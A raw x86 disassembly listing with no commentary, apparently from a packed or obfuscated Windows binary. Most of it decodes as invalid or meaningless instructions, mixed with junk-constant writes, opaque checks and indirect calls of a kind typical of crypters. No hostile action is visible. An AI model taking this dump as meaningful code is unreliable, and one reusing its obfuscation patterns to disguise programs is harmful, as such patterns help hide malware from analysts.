  40821c:	call   0x3e9eeda
  408221:	sub    al,0x8a
  408223:	iret   
  408224:	aaa    
  408225:	scas   al,BYTE PTR es:[edi]
  408226:	(bad)  
  408227:	iret   
  408228:	sahf   
  408229:	jmp    0x6cae:0x73e886bb
  408230:	int3   
  408231:	add    DWORD PTR ds:0xd711ed92,0xc29d3e1a
  40823b:	mov    edx,0x63caf434
  408240:	sub    eax,0xe231d5f8
  408245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408246:	lods   al,BYTE PTR ds:[esi]
  408248:	popa   
  408249:	popf   
  40824a:	jae    0x4081f9
  40824c:	out    dx,al
  40824d:	neg    DWORD PTR [edi]
  40824f:	mov    edi,cs
  408251:	dec    ebp
  408252:	stc    
  408253:	scas   eax,DWORD PTR es:[edi]
  408254:	arpl   WORD PTR [edx],di
  408256:	push   es
  408257:	xor    DWORD PTR [eax+0x7e],edx
  40825a:	xchg   DWORD PTR [edi],esp
  40825c:	mov    al,ds:0x82474c3a
  408261:	and    BYTE PTR [edi+ebx*2+0x60030d78],bl
  408268:	mov    al,0x0
  40826a:	cmc    
  40826b:	dec    edx
  40826c:	mov    ?,edx
  40826e:	add    eax,DWORD PTR [ebx-0x45]
  408271:	jmp    0x2c2b:0x1f67104f
  408278:	lds    edi,FWORD PTR [ebp-0x20]
  40827b:	push   eax
  40827c:	cld    
  40827d:	and    BYTE PTR [edx],bh
  40827f:	mov    ecx,cs
  408281:	ins    DWORD PTR es:[edi],dx
  408282:	xchg   esp,eax
  408283:	dec    edx
  408284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408285:	mov    al,ds:0xb596a723
  40828a:	addr16 daa 
  40828c:	sbb    eax,0x7f3f4b2f
  408291:	fmul   QWORD PTR [esi+esi*4-0x61]
  408295:	ins    DWORD PTR es:[edi],dx
  408296:	loopne 0x4082d3
  408298:	in     eax,dx
  408299:	dec    ebx
  40829a:	(bad)  
  40829b:	mov    eax,0x348146cd
  4082a0:	hlt    
  4082a1:	(bad)  
  4082a2:	dec    ebp
  4082a3:	dec    edx
  4082a4:	fs jno 0x40827d
  4082a7:	sub    eax,0x5bb32a53
  4082ac:	push   0x65
  4082ae:	mov    bl,0xbe
  4082b0:	fucomp st(5)
  4082b3:	jae    0x4082a7
  4082b5:	test   al,0x7b
  4082b7:	mov    cl,0xd2
  4082b9:	scas   al,BYTE PTR es:[edi]
  4082ba:	icebp  
  4082bb:	dec    edi
  4082bc:	and    eax,0xd681073
  4082c1:	cs ins DWORD PTR es:[edi],dx
  4082c3:	adc    eax,0x7a33d34c
  4082c8:	or     ebp,DWORD PTR ds:0x62f90f0d
  4082ce:	ds ja  0x4082fb
  4082d1:	jmp    DWORD PTR [edi+0x70]
  4082d4:	jmp    0x1db36b26
  4082d9:	xor    bl,BYTE PTR [eax-0x43]
  4082dc:	cmp    bh,BYTE PTR cs:[esp+ecx*2-0x2e]
  4082e1:	push   ebx
  4082e2:	push   esp
  4082e3:	dec    ebx
  4082e4:	jb     0x408277
  4082e6:	sub    esp,DWORD PTR [eiz*1-0x635b8f45]
  4082ed:	sbb    al,0x1c
  4082ef:	sub    BYTE PTR [ebp+eax*2-0x5c],al
  4082f3:	mov    ch,0x9f
  4082f5:	inc    ebx
  4082f6:	or     ecx,DWORD PTR [ebp+0x6e]
  4082f9:	imul   eax,edi,0x82ac71d8
  4082ff:	xor    eax,ecx
  408301:	and    DWORD PTR ds:0x43377f,0x1370
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0xaad031d2
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x40838d
  40838a:	lods   eax,DWORD PTR ds:[esi]
  40838b:	rol    BYTE PTR [ecx-0x57c5d865],0x3a
  408392:	jmp    0x4885:0x4dc072e3
  408399:	push   esp
  40839a:	shl    ebx,1
  40839c:	aam    0x64
  40839e:	fst    QWORD PTR [edi-0x12a35738]
  4083a4:	arpl   di,bx
  4083a6:	ins    DWORD PTR es:[edi],dx
  4083a7:	add    dh,BYTE PTR [eax-0x15]
  4083aa:	cmp    al,0xc4
  4083ac:	mul    BYTE PTR [ebp+ebx*2+0x21]
  4083b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083b1:	adc    eax,0xc93562a
  4083b6:	pushf  
  4083b7:	and    dl,ch
  4083b9:	(bad)  
  4083ba:	fdiv   QWORD PTR [ebx]
  4083bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083bd:	cmp    ebp,ebp
  4083bf:	jns    0x4083fa
  4083c1:	ss leave 
  4083c3:	retf   
  4083c4:	sbb    ch,cl
  4083c6:	std    
  4083c7:	dec    eax
  4083c8:	mov    ecx,0x87194c43
  4083cd:	dec    ebx
  4083ce:	out    0xf9,eax
  4083d0:	ds pop eax
  4083d2:	add    eax,ebx
  4083d4:	fst    DWORD PTR [edx]
  4083d6:	xor    BYTE PTR gs:[ecx],ch
  4083d9:	xlat   BYTE PTR ds:[ebx]
  4083da:	mov    al,ds:0x22c7f511
  4083df:	fisttp WORD PTR [ebx+0x75f2722d]
  4083e5:	daa    
  4083e6:	scas   al,BYTE PTR es:[edi]
  4083e7:	leave  
  4083e8:	mov    eax,0xb18c3b56
  4083ed:	cli    
  4083ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083ef:	lds    esp,FWORD PTR [edx-0x6f]
  4083f2:	cmp    al,0xc7
  4083f4:	stos   BYTE PTR es:[edi],al
  4083f5:	pop    edx
  4083f6:	dec    ebp
  4083f7:	push   ds
  4083f8:	mov    esp,0xb731ce04
  4083fd:	pop    es
  4083fe:	and    bh,BYTE PTR ds:0x3e7cc5e8
  408404:	sti    
  408405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408406:	stc    
  408407:	outs   dx,DWORD PTR ds:[esi]
  408408:	adc    eax,0xade45daf
  40840d:	sub    edx,esi
  40840f:	loope  0x40840e
  408411:	fmul   st(5),st
  408413:	fstp   QWORD PTR [ebx+0x5e54fda8]
  408419:	jl     0x4083b5
  40841b:	inc    esp
  40841c:	mov    al,0xce
  40841e:	mov    ebp,0xe4febdb3
  408423:	mov    bl,0x4a
  408425:	cmp    eax,0xa405aeb4
  40842a:	(bad)  
  40842b:	jl     0x4083bc
  40842d:	jmp    0x94a1866b
  408432:	into   
  408433:	repnz inc ebx
  408435:	gs fwait
  408437:	xor    dh,cl
  408439:	mov    al,0xc3
  40843b:	push   0x7cbf907f
  408440:	pop    ebx
  408441:	jne    0x408491
  408443:	retf   0x17ae
  408446:	inc    eax
  408447:	and    al,dh
  408449:	xchg   esp,eax
  40844a:	nop
  40844b:	fld    TBYTE PTR [ecx-0x1d7fac52]
  408451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408452:	xchg   edi,eax
  408453:	test   eax,0x655cb6b4
  408458:	mov    ds:0x58d1b7f2,eax
  40845d:	rep outs dx,DWORD PTR ds:[esi]
  40845f:	add    ebx,ecx
  408461:	outs   dx,DWORD PTR ds:[esi]
  408462:	(bad)
  408465:	mov    edx,0x7e761feb
  40846a:	and    ebx,ebx
  40846c:	std    
  40846d:	jns    0x408422
  40846f:	xchg   edx,eax
  408470:	jb     0x408480
  408472:	leave  
  408473:	inc    edx
  408474:	mov    dl,0xd1
  408476:	call   0xfc2386db
  40847b:	or     al,0xb2
  40847d:	lea    ecx,[eax-0x47b43d70]
  408483:	sbb    al,0x20
  408485:	push   ebx
  408486:	mov    al,0xf
  408488:	pop    esi
  408489:	(bad)  
  40848a:	outs   dx,DWORD PTR ds:[esi]
  40848b:	mov    esi,0x88c8a478
  408490:	lds    edi,FWORD PTR [edi+ecx*4+0x5a]
  408494:	hlt    
  408495:	pop    eax
  408496:	enter  0x6a26,0xec
  40849a:	lahf   
  40849b:	sub    eax,0x25f6e0e0
  4084a0:	ret    0x56d2
  4084a3:	inc    esi
  4084a4:	add    ebp,DWORD PTR [ebp+0x5476e51f]
  4084aa:	jge    0x40852b
  4084ac:	bound  ebx,QWORD PTR [ebx-0x5d59cb68]
  4084b2:	rcr    DWORD PTR [ebx-0x77],0xc3
  4084b6:	rcr    BYTE PTR [eax],1
  4084b8:	dec    eax
  4084b9:	mov    al,0xf2
  4084bb:	mov    bl,BYTE PTR [ebp-0x31]
  4084be:	xor    DWORD PTR [esi+0x4e],0x61
  4084c2:	test   eax,0x3f9fdfdf
  4084c7:	aas    
  4084c8:	jae    0x40847a
  4084ca:	jnp    0x4084d9
  4084cc:	sub    bh,ah
  4084ce:	rcl    esp,1
  4084d0:	popa   
  4084d1:	pop    ds
  4084d2:	ins    BYTE PTR es:[edi],dx
  4084d3:	iret   
  4084d4:	jg     0x408492
  4084d6:	stos   DWORD PTR es:[edi],eax
  4084d7:	jno    0x40848f
  4084d9:	xor    esp,DWORD PTR [edx]
  4084db:	je     0x408486
  4084dd:	fwait
  4084de:	cmp    BYTE PTR [ecx-0x75dbfd67],0x5c
  4084e5:	pop    ecx
  4084e6:	hlt    
  4084e7:	push   eax
  4084e8:	push   ecx
  4084e9:	ret    
  4084ea:	add    ecx,DWORD PTR [edi]
  4084ec:	pop    ecx
  4084ed:	bound  esp,QWORD PTR [edx-0x1f753f6a]
  4084f3:	je     0x408e47
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43382f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43382f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43382f,edx
  408521:	cmp    DWORD PTR ds:0x43382f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43382f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433867
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433717,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433773
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4337bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4337bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4337bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4337bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4337bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	std    
  4085de:	dec    edx
  4085df:	or     al,bl
  4085e1:	in     al,dx
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	gs dec edi
  4085eb:	popa   
  4085ec:	and    ah,BYTE PTR [edi]
  4085ee:	in     eax,0xe7
  4085f0:	mov    al,0x89
  4085f2:	ret    0x2df1
  4085f5:	imul   edx,DWORD PTR [edi+0x5884da1a],0xba3b4c39
  4085ff:	push   ss
  408600:	jmp    0xbcf38e2
  408605:	jnp    0x408683
  408607:	xchg   ebp,eax
  408608:	mov    dl,0x13
  40860a:	sar    DWORD PTR [edx-0x6708adc8],1
  408610:	push   ss
  408611:	cwde   
  408612:	mov    ebx,0x2afb82f2
  408617:	ins    DWORD PTR es:[edi],dx
  408618:	pop    ss
  408619:	fs mov ebp,0x9c00f782
  40861f:	mov    DWORD PTR [edx+0x20a7249e],ecx
  408625:	ret    
  408626:	inc    ebx
  408627:	out    0x93,al
  408629:	xor    BYTE PTR [ebp-0x102829a6],dh
  40862f:	pop    edi
  408630:	retf   
  408631:	cmp    eax,0x13df4d8d
  408636:	mov    bl,0x4e
  408638:	dec    ecx
  408639:	mov    esi,0x7103c949
  40863e:	fisttp DWORD PTR [ebx+0x439877a8]
  408644:	mov    ds:0xd1a987be,eax
  408649:	xchg   BYTE PTR [ecx+0x761a5181],bh
  40864f:	loope  0x4086c3
  408651:	pop    ebx
  408652:	dec    esi
  408653:	xchg   DWORD PTR [ecx+0x78bf3ab1],edi
  408659:	popf   
  40865a:	mov    ecx,0x9a0372df
  40865f:	int3   
  408660:	(bad)  
  408661:	dec    esp
  408662:	jecxz  0x4086d3
  408664:	jno    0x408695
  408666:	in     al,dx
  408667:	stos   BYTE PTR es:[edi],al
  408668:	jp     0x40860e
  40866a:	jl     0x40860c
  40866c:	loope  0x40863e
  40866e:	hlt    
  40866f:	pop    ebx
  408670:	gs scas al,BYTE PTR es:[edi]
  408672:	rol    BYTE PTR [eax-0x60d4f6ff],cl
  408678:	or     DWORD PTR [edi+0x4a958f2a],ebp
  40867e:	sub    cl,al
  408680:	retf   0xaf82
  408683:	pop    esp
  408684:	stos   DWORD PTR es:[edi],eax
  408685:	loopne 0x408623
  408687:	cmp    bh,BYTE PTR [edi+0xe]
  40868a:	mov    ebx,0xa9f6f192
  40868f:	sbb    eax,0x400dded5
  408694:	add    al,0x11
  408696:	jnp    0x408709
  408698:	mov    DWORD PTR [edx+0x2c],ecx
  40869b:	idiv   ebx
  40869d:	mov    ecx,0xc169791f
  4086a2:	xchg   edx,eax
  4086a3:	mov    dh,0x5c
  4086a5:	leave  
  4086a6:	mov    BYTE PTR ds:0x20bd78cc,ah
  4086ac:	mov    edi,0x85cd58e2
  4086b1:	mov    es,ebx
  4086b3:	repnz pop ds
  4086b5:	out    dx,eax
  4086b6:	push   edx
  4086b7:	sbb    ebx,ebp
  4086b9:	push   0x79
  4086bb:	rcr    BYTE PTR [ebp-0x16],cl
  4086be:	in     al,0x7
  4086c0:	and    BYTE PTR [ebp+0x7ab5f366],dh
  4086c6:	cmp    eax,0x19b51602
  4086cb:	fcom   QWORD PTR ds:0x7c1e0e0
  4086d1:	arpl   WORD PTR [eax-0x64],di
  4086d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d5:	xchg   ecx,eax
  4086d6:	pop    ebp
  4086d7:	mul    edi
  4086d9:	pusha  
  4086da:	gs cdq 
  4086dc:	repz or al,0xd3
  4086df:	lods   eax,DWORD PTR ds:[esi]
  4086e0:	out    0x7,eax
  4086e2:	push   cs
  4086e3:	(bad)  
  4086e4:	xchg   esi,eax
  4086e5:	and    BYTE PTR [edx],0xab
  4086e8:	dec    esi
  4086e9:	mov    esi,0x72c1bb73
  4086ee:	mov    edi,0xce423cdb
  4086f3:	xor    dl,BYTE PTR [edx-0x8f90ea]
  4086f9:	loope  0x408701
  4086fb:	add    WORD PTR [edx+0x6b],dx
  4086ff:	ret    
  408700:	dec    eax
  408701:	add    DWORD PTR ds:0x1aa60e76,ecx
  408707:	fld    TBYTE PTR [edx-0x57]
  40870a:	sahf   
  40870b:	test   al,0xb6
  40870d:	mov    eax,0x2d1d8ab8
  408712:	clc    
  408713:	xchg   esi,eax
  408714:	sbb    DWORD PTR [edx-0x2b973664],edi
  40871a:	lahf   
  40871b:	bswap  ebx
  40871d:	mov    ds:0x3e59f1a0,al
  408722:	xchg   edx,eax
  408723:	xchg   BYTE PTR [ebx+edi*8],ch
  408726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408727:	je     0x4086a9
  408729:	sbb    ebp,ebp
  40872b:	push   es
  40872c:	sahf   
  40872d:	cmp    esp,DWORD PTR gs:[eax]
  408730:	mov    dh,ch
  408732:	(bad)  
  408733:	retf   0x6739
  408736:	xchg   ebp,eax
  408737:	je     0x408776
  408739:	and    eax,0xf77aafc
  40873e:	jne    0x408739
  408740:	std    
  408741:	xchg   BYTE PTR [esi+0x37c3d11f],ch
  408747:	jb     0x408753
  408749:	jbe    0x408780
  40874b:	out    0x8b,eax
  40874d:	fdivr  QWORD PTR [eax]
  40874f:	fisub  DWORD PTR [esi+0x458b7624]
  408755:	clc    
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     bh,ch
  40876c:	lea    esi,[edx+0x7ed35272]
  408772:	jle    0x408758
  408774:	jg     0x4087f4
  408776:	jle    0x4087e9
  408778:	mov    cl,0xba
  40877a:	dec    ecx
  40877b:	jp     0x4087cb
  40877d:	(bad)  
  40877e:	fsubr  QWORD PTR [ebx]
  408780:	sahf   
  408781:	pop    esp
  408782:	rcl    DWORD PTR [edx],1
  408784:	or     eax,0xcc510844
  408789:	xor    BYTE PTR [edi-0x2be13f4e],ah
  40878f:	pop    ds
  408790:	in     eax,dx
  408791:	fiadd  WORD PTR [esi-0x1d3f827c]
  408797:	cmp    eax,0x1f9ec773
  40879c:	add    BYTE PTR [ecx],dl
  40879e:	fcomip st,st(2)
  4087a0:	scas   eax,DWORD PTR es:[edi]
  4087a1:	imul   ecx,edi,0x92c9c3f4
  4087a7:	dec    eax
  4087a8:	sub    eax,0x5a90dd5d
  4087ad:	jge    0x408790
  4087af:	push   0x16882d77
  4087b4:	jb     0x40882f
  4087b6:	sbb    bh,BYTE PTR [ecx-0x24]
  4087b9:	ins    BYTE PTR es:[edi],dx
  4087ba:	fldenv [ebx]
  4087bc:	sbb    bl,dh
  4087be:	xchg   ebx,eax
  4087bf:	leave  
  4087c0:	imul   edi,DWORD PTR [ebp-0x6e],0xffffffa9
  4087c4:	outs   dx,DWORD PTR ds:[esi]
  4087c5:	out    dx,eax
  4087c6:	aas    
  4087c7:	lods   eax,DWORD PTR ds:[esi]
  4087c8:	pusha  
  4087c9:	inc    eax
  4087ca:	adc    BYTE PTR [ecx+0x7007a136],0x5
  4087d1:	hlt    
  4087d2:	cdq    
  4087d3:	add    dl,cl
  4087d5:	mov    ebx,0x7062f2fc
  4087da:	and    BYTE PTR [esi+0x64],bl
  4087dd:	dec    ecx
  4087de:	popa   
  4087df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087e0:	mov    bl,dl
  4087e2:	rcl    BYTE PTR cs:[ecx+eax*8],1
  4087e6:	mov    esi,0xa7996e2c
  4087eb:	(bad)  
  4087ec:	jmp    0x6036:0xd449a9ea
  4087f3:	xchg   edi,eax
  4087f4:	xchg   ebx,eax
  4087f5:	mul    BYTE PTR [edx]
  4087f7:	pop    eax
  4087f8:	lea    ebx,[edi-0x549a1f73]
  4087fe:	test   DWORD PTR [ecx+0x951bdcb],edx
  408804:	std    
  408805:	sub    dl,cl
  408807:	cmp    BYTE PTR [edx+0x53],0x7b
  40880b:	dec    edx
  40880c:	adc    cl,cl
  40880e:	dec    ebx
  40880f:	shl    ebp,1
  408811:	imul   ecx,DWORD PTR [edx+edx*2-0x71],0x23
  408816:	idiv   bl
  408818:	out    dx,eax
  408819:	mov    ebx,0xc001835c
  40881e:	clc    
  40881f:	xlat   BYTE PTR ds:[ebx]
  408820:	retf   
  408821:	call   0xde1012a4
  408826:	rol    DWORD PTR [edx-0x2d5a566b],cl
  40882c:	mov    edx,0xf4c0572a
  408831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408832:	cmp    DWORD PTR [ecx-0x1290d13c],ebp
  408838:	inc    ecx
  408839:	stos   BYTE PTR es:[edi],al
  40883a:	fcomip st,st(5)
  40883c:	mov    dl,bh
  40883e:	adc    DWORD PTR [ebp-0x312c2ba2],0x5d
  408845:	icebp  
  408846:	clc    
  408847:	popf   
  408848:	cmc    
  408849:	xchg   BYTE PTR [edx-0x27],bl
  40884c:	imul   ecx,DWORD PTR [ebx+0x45],0x6f
  408850:	mov    bh,0x52
  408852:	cmp    ah,cl
  408854:	mov    dl,0x25
  408856:	ja     0x408806
  408858:	stc    
  408859:	in     al,dx
  40885a:	(bad)  
  40885b:	or     edi,DWORD PTR [edi-0x5d]
  40885e:	imul   edi,ecx,0x4a6e34f
  408864:	out    0xf1,al
  408866:	hlt    
  408867:	cmp    dh,BYTE PTR [esi-0x2c10571c]
  40886d:	imul   edi,esp,0x36
  408870:	scas   al,BYTE PTR es:[edi]
  408871:	push   edi
  408872:	xchg   BYTE PTR [ebx+0x76],bh
  408875:	ins    DWORD PTR es:[edi],dx
  408876:	push   es
  408877:	jnp    0x408816
  408879:	es loop 0x4088ef
  40887c:	mov    ecx,DWORD PTR [ebx+0x20db4ba7]
  408882:	dec    ebx
  408883:	mov    esp,0x312fc0bb
  408888:	adc    al,0x3
  40888a:	mov    al,0x58
  40888c:	fadd   QWORD PTR [edx+ebx*8+0x10171ea6]
  408893:	add    eax,0xfeebe2fb
  408898:	std    
  408899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40889a:	in     eax,dx
  40889b:	push   edi
  40889c:	push   0xffffffff
  40889e:	pop    edx
  40889f:	(bad)  
  4088a0:	scas   al,BYTE PTR es:[edi]
  4088a1:	fcompp 
  4088a3:	data16 shl bh,0x8e
  4088a7:	jl     0x4088fa
  4088a9:	fcmovbe st,st(5)
  4088ab:	pop    ebp
  4088ac:	mov    eax,ds:0x69c89fae
  4088b1:	sbb    DWORD PTR [edx],edi
  4088b3:	and    DWORD PTR [eax-0x478215af],ebp
  4088b9:	push   ebp
  4088ba:	add    DWORD PTR gs:[esi-0x2b3a5d21],edx
  4088c1:	sub    DWORD PTR [esi-0x26],edx
  4088c4:	mov    edi,0xa6224eff
  4088c9:	mov    ah,0x27
  4088cb:	push   edx
  4088cc:	clc    
  4088cd:	fimul  DWORD PTR [edi-0x9ed65b0]
  4088d3:	mov    bh,0x5b
  4088d5:	mov    cl,0x59
  4088d7:	fisttp WORD PTR [edx]
  4088d9:	outs   dx,BYTE PTR ds:[esi]
  4088da:	in     al,dx
  4088db:	xor    eax,0x9d8c3f9e
  4088e0:	mov    bl,BYTE PTR [edi+0x5e]
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0xac9e681a
  40893f:	scas   eax,DWORD PTR es:[edi]
  408940:	xchg   BYTE PTR [eax],bh
  408942:	sar    DWORD PTR [esi+0x7e],1
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	fdiv   QWORD PTR [edi+0x1c]
  40894c:	loope  0x4088ee
  40894e:	sbb    BYTE PTR [esp+eiz*4+0x6b],cl
  408952:	sbb    bh,BYTE PTR [edi-0x7747b6a5]
  408958:	test   BYTE PTR [edi-0x3f7d38e2],al
  40895e:	cmp    eax,0x1f39d215
  408963:	sub    al,0xd
  408965:	lock and eax,0x68057330
  40896b:	inc    ecx
  40896c:	jecxz  0x40894a
  40896e:	inc    ecx
  40896f:	mov    al,0x9c
  408971:	shr    DWORD PTR [eax],cl
  408973:	mov    ah,BYTE PTR [ecx+0x3b]
  408976:	lods   al,BYTE PTR ds:[esi]
  408977:	iret   
  408978:	loopne 0x4089cc
  40897a:	mov    bh,0xfc
  40897c:	pop    ebx
  40897d:	pop    ebx
  40897e:	cld    
  40897f:	out    0x16,eax
  408981:	dec    esi
  408982:	fldenv [esi+0x3b837907]
  408988:	xchg   ecx,eax
  408989:	mov    ebp,0xc31ab01
  40898e:	mov    bl,0x94
  408990:	call   DWORD PTR [ebp-0x29a5a17d]
  408996:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408998:	pop    ecx
  408999:	jns    0x4089ac
  40899b:	lock pop ds
  40899d:	jp     0x4089fe
  40899f:	call   0xf62fd32e
  4089a4:	pop    es
  4089a5:	inc    esi
  4089a6:	add    esp,DWORD PTR [edi]
  4089a8:	leave  
  4089a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089aa:	or     esp,DWORD PTR [ebx+0x4c56c0fd]
  4089b0:	nop
  4089b1:	lock clc 
  4089b3:	adc    BYTE PTR [ecx+0x65649917],al
  4089b9:	fucomip st,st(2)
  4089bb:	dec    ebx
  4089bc:	adc    al,0x81
  4089be:	loope  0x408951
  4089c0:	xchg   ebx,eax
  4089c1:	sub    ebx,DWORD PTR [esi-0x2af8b60]
  4089c7:	mov    eax,0x5616c707
  4089cc:	or     al,0x8f
  4089ce:	rcl    BYTE PTR [edx],0xe4
  4089d1:	cmp    cl,BYTE PTR ds:0x73e2b0b
  4089d7:	dec    edi
  4089d8:	mov    ebx,0x8945e2d7
  4089dd:	push   0xcbfbe019
  4089e2:	cmp    ch,ch
  4089e4:	push   eax
  4089e5:	repz iret 
  4089e7:	mov    ebx,0xfe8c3181
  4089ec:	mov    eax,0xf0c33c8a
  4089f1:	std    
  4089f2:	mov    DWORD PTR [edx-0x55],0x27c88920
  4089f9:	mov    ah,0xe1
  4089fb:	sti    
  4089fc:	mov    al,ds:0x32243280
  408a01:	fist   WORD PTR [ebp+0x58216e27]
  408a07:	and    BYTE PTR [ebx],0xad
  408a0a:	sub    eax,0xb5328dd
  408a0f:	ret    0x7283
  408a12:	sahf   
  408a13:	push   ebp
  408a14:	mov    dh,0x6f
  408a16:	ret    
  408a17:	int3   
  408a18:	sbb    bh,BYTE PTR [edi+0xc]
  408a1b:	(bad)  
  408a1c:	push   esp
  408a1d:	cmp    al,0x9e
  408a1f:	outs   dx,DWORD PTR ds:[esi]
  408a20:	lods   al,BYTE PTR ds:[esi]
  408a21:	sbb    al,0x42
  408a23:	sub    al,0x98
  408a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a26:	adc    cl,BYTE PTR [ecx+ebx*2-0x543fb99d]
  408a2d:	loope  0x408a40
  408a2f:	dec    eax
  408a30:	test   eax,0xb14590d8
  408a35:	xchg   edi,eax
  408a36:	(bad)  
  408a37:	daa    
  408a38:	or     dl,0xca
  408a3b:	in     al,dx
  408a3c:	fs fs jo 0x408a0b
  408a40:	out    dx,al
  408a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a42:	sub    al,0x4c
  408a44:	xchg   edi,eax
  408a45:	xchg   DWORD PTR [eax],ebp
  408a47:	xlat   BYTE PTR ds:[ebx]
  408a48:	shl    dl,1
  408a4a:	jg     0x408ab1
  408a4c:	mov    al,ds:0xd1855870
  408a51:	dec    ebx
  408a52:	mov    ecx,0xfe329ab
  408a57:	push   cs
  408a58:	jmp    0xf1b2:0x26b0ffbf
  408a5f:	xor    al,0xc6
  408a61:	and    cl,BYTE PTR [edx-0x12]
  408a64:	inc    ecx
  408a65:	std    
  408a66:	test   eax,0x8b0651f5
  408a6b:	and    eax,0x1aa7bf5b
  408a70:	xor    ebx,DWORD PTR [eax+0x4a]
  408a73:	or     eax,0xb9b11b0a
  408a78:	and    cl,BYTE PTR [edi+0x1b]
  408a7b:	imul   dl
  408a7d:	jmp    DWORD PTR [eax-0x7b]
  408a80:	xor    al,0xe1
  408a82:	mov    ebp,0xe1bdacec
  408a87:	push   esp
  408a88:	lahf   
  408a89:	outs   dx,DWORD PTR ds:[esi]
  408a8a:	and    ah,BYTE PTR [esi+esi*8+0x71ff4dfb]
  408a91:	hlt    
  408a92:	fwait
  408a93:	test   dh,bh
  408a95:	push   eax
  408a96:	cmp    bh,BYTE PTR [ebx+0x5f]
  408a99:	arpl   WORD PTR [edx-0x11],bp
